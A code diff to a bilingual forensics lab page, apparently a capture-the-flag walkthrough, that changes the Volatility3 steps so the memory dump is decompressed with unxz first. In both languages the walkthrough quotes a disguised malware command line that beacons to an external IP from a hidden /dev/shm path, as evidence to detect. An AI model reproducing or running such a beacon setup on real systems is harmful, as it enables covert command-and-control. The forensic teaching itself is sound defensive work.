@@ -14,13 +14,14 @@
 
   <div class="hl-card mb-4">
     <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este volcado de memoria</h3>
-    <p class="text-sm text-gray-600 dark:text-gray-400">Este es un volcado de memoria física <strong>real</strong>, de un kernel Linux (Debian 6.1) arrancado específicamente para este laboratorio en una VM mínima — no es texto plano simulado. Es pequeño (unos 15 MB comprimidos, frente a los varios GB de un volcado de producción) porque la VM se diseñó con el mínimo de RAM necesario para arrancar, pero las estructuras internas del kernel son 100% genuinas: <code>volatility3</code> lo analiza exactamente igual que analizaría un volcado real, con los mismos plugins (<code>linux.pslist</code>, <code>linux.psaux</code>, etc.).</p>
+    <p class="text-sm text-gray-600 dark:text-gray-400">Este es un volcado de memoria física <strong>real</strong>, de un kernel Linux (Debian 6.1) arrancado específicamente para este laboratorio en una VM mínima — no es texto plano simulado. Es pequeño (unos 15 MB comprimidos, frente a los varios GB de un volcado de producción) porque la VM se diseñó con el mínimo de RAM necesario para arrancar, pero las estructuras internas del kernel son 100% genuinas: <code>volatility3</code> lo analiza exactamente igual que analizaría un volcado real, con los mismos plugins (<code>linux.pslist</code>, <code>linux.psaux</code>, etc.). Volatility3 puede leer el <code>.raw.xz</code> directamente sin descomprimir, pero al no ser un formato con acceso aleatorio, cada lectura no secuencial reprocesa el stream desde el principio — cada plugin puede tardar varios minutos así. Descomprime primero con <code>unxz -k</code> (ver Inicio rápido) y el mismo análisis tarda segundos.</p>
   </div>
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="df_quickstart">Inicio rápido</h2>
     <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)">unzip memdump_server01_hacklabs.zip
-vol --symbol-dirs . -f memdump_server01.raw.xz linux.pslist</pre>
+unxz -k memdump_server01.raw.xz
+vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
   </div>
 
   {% include 'labs/_forensic_questions.html' %}
@@ -34,21 +35,25 @@ vol --symbol-dirs . -f memdump_server01.raw.xz linux.pslist</pre>
     <h3>2 · Descomprimir e indicar los símbolos</h3>
     <pre>unzip memdump_server01_hacklabs.zip
 ls
-# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
-    <p>No hace falta mover nada a la carpeta de símbolos de Volatility3 (<code>~/.cache/volatility3/symbols/</code>): basta con apuntar <code>--symbol-dirs</code> a la carpeta donde has descomprimido el zip, y Volatility3 encontrará el <code>.json.xz</code> automáticamente por su banner. Volatility3 también soporta leer <code>.xz</code> directamente, así que no hace falta descomprimir el volcado.</p>
+# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
+unxz -k memdump_server01.raw.xz
+ls
+# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
+    <p>No hace falta mover nada a la carpeta de símbolos de Volatility3 (<code>~/.cache/volatility3/symbols/</code>): basta con apuntar <code>--symbol-dirs</code> a la carpeta donde has descomprimido el zip, y Volatility3 encontrará el <code>.json.xz</code> automáticamente por su banner.</p>
+    <p><strong>Descomprime también el volcado antes de analizarlo.</strong> Volatility3 sabe leer <code>.raw.xz</code> directamente, pero xz no es un formato de acceso aleatorio: cada lectura no contigua que hace un plugin (localizar <code>task_struct</code>, seguir punteros dispersos por toda la RAM…) obliga a reprocesar el stream comprimido, y cada ejecución puede tardar varios minutos. Descomprimiendo una vez con <code>unxz -k</code> (la copia <code>.xz</code> se conserva por el flag <code>-k</code>), el mismo análisis pasa de minutos a segundos.</p>
 
     <h3>3 · Listar los procesos</h3>
-    <pre>vol --symbol-dirs . -f memdump_server01.raw.xz linux.pslist</pre>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
     <p>Verás decenas de hilos de kernel legítimos (<code>kworker/0:0</code>, <code>ksoftirqd/0</code>, <code>rcu_gp</code>… todos con PPID 2, hijos de <code>kthreadd</code>) y, al final, un puñado de procesos de "espacio de usuario": <code>sshd</code>, <code>cron</code>, <code>rsyslogd</code>, <code>systemd-journal</code> — y uno más, <code>kworker/u4:2</code>, que por su nombre parecería un hilo de kernel más.</p>
 
     <h3>4 · Detectar la anomalía con psaux</h3>
-    <pre>vol --symbol-dirs . -f memdump_server01.raw.xz linux.psaux</pre>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux</pre>
     <p>Aquí está la clave: un hilo de kernel <strong>genuino</strong> no tiene ni ejecutable ni línea de comandos real — <code>psaux</code> lo muestra entre corchetes, repitiendo el nombre (p.ej. <code>[kworker/0:1]</code>), porque no hay ningún <code>argv</code> que mostrar. Compáralo con nuestro sospechoso:</p>
     <pre>86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}</pre>
     <p>Este proceso <strong>sí</strong> tiene un ejecutable real (<code>/dev/shm/.systemd/kworker</code> — una ruta que ningún hilo de kernel usaría jamás) y una línea de comandos completa con una IP y puerto externos: un patrón de beacon C2 clásico, disfrazado con un nombre que un análisis superficial con <code>ps</code>/<code>top</code> pasaría por alto sin pensarlo dos veces.</p>
 
     <h3>5 · Capturar la flag</h3>
-    <pre>vol --symbol-dirs . -f memdump_server01.raw.xz linux.psaux | grep HL</pre>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigación</h3>
@@ -69,21 +74,25 @@ ls
     <h3>2 · Unzip and point at the symbols</h3>
     <pre>unzip memdump_server01_hacklabs.zip
 ls
-# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
-    <p>No need to move anything into Volatility3's symbol cache (<code>~/.cache/volatility3/symbols/</code>): just point <code>--symbol-dirs</code> at the folder where you unzipped the bundle, and Volatility3 will find the <code>.json.xz</code> automatically by its banner. Volatility3 also reads <code>.xz</code> directly, so there's no need to decompress the dump either.</p>
+# memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz
+unxz -k memdump_server01.raw.xz
+ls
+# memdump_server01.raw  memdump_server01.raw.xz  volatility3_symbols_debian-6.1.0-52-amd64.json.xz</pre>
+    <p>No need to move anything into Volatility3's symbol cache (<code>~/.cache/volatility3/symbols/</code>): just point <code>--symbol-dirs</code> at the folder where you unzipped the bundle, and Volatility3 will find the <code>.json.xz</code> automatically by its banner.</p>
+    <p><strong>Decompress the dump too before analyzing it.</strong> Volatility3 can read <code>.raw.xz</code> directly, but xz isn't a random-access format: every non-contiguous read a plugin does (locating <code>task_struct</code>, following pointers scattered across RAM…) forces it to reprocess the compressed stream, and a single run can take several minutes. Decompress once with <code>unxz -k</code> (the <code>-k</code> flag keeps the <code>.xz</code> copy too) and the same analysis drops from minutes to seconds.</p>
 
     <h3>3 · List the processes</h3>
-    <pre>vol --symbol-dirs . -f memdump_server01.raw.xz linux.pslist</pre>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.pslist</pre>
     <p>You'll see dozens of legitimate kernel threads (<code>kworker/0:0</code>, <code>ksoftirqd/0</code>, <code>rcu_gp</code>… all with PPID 2, children of <code>kthreadd</code>) and, at the end, a handful of "userspace" processes: <code>sshd</code>, <code>cron</code>, <code>rsyslogd</code>, <code>systemd-journal</code> — and one more, <code>kworker/u4:2</code>, which by its name would look like just another kernel thread.</p>
 
     <h3>4 · Spot the anomaly with psaux</h3>
-    <pre>vol --symbol-dirs . -f memdump_server01.raw.xz linux.psaux</pre>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux</pre>
     <p>Here's the tell: a <strong>genuine</strong> kernel thread has no real executable or command line — <code>psaux</code> shows it in brackets, just repeating the name (e.g. <code>[kworker/0:1]</code>), because there's no <code>argv</code> to show. Compare it to our suspect:</p>
     <pre>86  1  kworker/u4:2  /dev/shm/.systemd/kworker --connect 185.220.101.47:443 --beacon 60 --id HL{···}</pre>
     <p>This process <strong>does</strong> have a real executable (<code>/dev/shm/.systemd/kworker</code> — a path no genuine kernel thread would ever use) and a full command line with an external IP and port: a classic C2 beacon pattern, disguised behind a name a quick glance at <code>ps</code>/<code>top</code> would skip right past.</p>
 
     <h3>5 · Capture the flag</h3>
-    <pre>vol --symbol-dirs . -f memdump_server01.raw.xz linux.psaux | grep HL</pre>
+    <pre>vol --symbol-dirs . -f memdump_server01.raw linux.psaux | grep HL</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigation</h3>
